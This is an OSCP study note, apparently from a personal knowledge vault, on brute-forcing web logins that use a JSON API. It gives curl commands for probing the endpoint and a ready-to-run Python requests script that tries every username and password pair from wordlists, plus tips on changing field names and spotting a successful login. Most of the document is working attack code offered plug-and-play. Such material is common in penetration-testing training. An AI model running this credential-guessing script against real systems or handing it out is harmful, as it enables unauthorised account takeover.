# Web Login Brute Force — Python Requests (OSCP)

Use this approach when the login page uses a **JSON API** instead of a standard HTML form.
You can tell by checking the page source or JS files for `fetch()`, `XMLHttpRequest`, or `Content-Type: application/json`.

> For standard HTML forms or SSH/FTP/RDP: use [[Hydra]] instead.

---

## Step 1 — Identify the Login Mechanism

Always check the JS files before building your attack:

```bash
curl -s http://<IP>:<PORT>/static/js/login.js
```

Or view page source in the browser and look for script tags.

What you're looking for:
- The **endpoint** (e.g. `/api/login`)
- The **method** (GET or POST)
- The **field names** (`email`, `username`, `password`, etc.)
- The **format** (JSON body vs form-encoded)

---

## Step 2 — Test a Single Login with curl

Confirm the API works before scripting:

```bash
curl -s -X POST http://<IP>:<PORT>/api/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"test@test.com","password":"test"}'
```

Note the **exact failure message** — you'll use it to detect hits.

---

## Step 3 — Build Your Username and Password Lists

Save emails/usernames to `users.txt`, one per line:
```
admin@company.com
john.doe@company.com
jane.smith@company.com
```

Save passwords to `passwords.txt`, one per line:
```
password
password123
admin
Password1
```

---

## Step 4 — Run the Brute Force Script

**Plug and play — edit the 3 variables at the top:**

```python
#!/usr/bin/env python3
import requests

# ── EDIT THESE ──────────────────────────────────────────
URL      = "http://<IP>:<PORT>/api/login"
USER_FILE = "users.txt"
PASS_FILE = "passwords.txt"
# ────────────────────────────────────────────────────────

with open(USER_FILE) as f:
    users = [line.strip() for line in f if line.strip()]

with open(PASS_FILE) as f:
    passwords = [line.strip() for line in f if line.strip()]

for user in users:
    for pwd in passwords:
        try:
            r = requests.post(
                URL,
                json={"email": user, "password": pwd},
                timeout=5
            )
            if r.status_code == 200:
                print(f"[+] FOUND: {user} : {pwd}")
                print(f"    Response: {r.text}")
            else:
                print(f"[-] {user} : {pwd}")
        except requests.exceptions.RequestException as e:
            print(f"[!] Error: {e}")
```

Run it:
```bash
python3 brute.py
```

---

## Adapting for Different Field Names

If the login fields are `username` and `password` instead of `email` and `password`:

Change this line in the script:
```python
json={"email": user, "password": pwd},
```
To:
```python
json={"username": user, "password": pwd},
```

If it uses form-encoded data instead of JSON (`Content-Type: application/x-www-form-urlencoded`):

Change:
```python
r = requests.post(URL, json={"email": user, "password": pwd}, timeout=5)
```
To:
```python
r = requests.post(URL, data={"email": user, "password": pwd}, timeout=5)
```

---

## Detecting Success

The script above checks `status_code == 200`. You may need to adjust this depending on the app.

Other ways to detect a successful login:

```python
# Check for specific text in the response
if "Welcome" in r.text or "dashboard" in r.text:

# Check for absence of failure text
if "Invalid" not in r.text and "failed" not in r.text:

# Check for a redirect or session cookie
if "session" in r.cookies or r.status_code == 302:
```

---

## Related Notes

- [[Hydra]]
- [[Web_Enum]]
- [[Password_Spraying]]
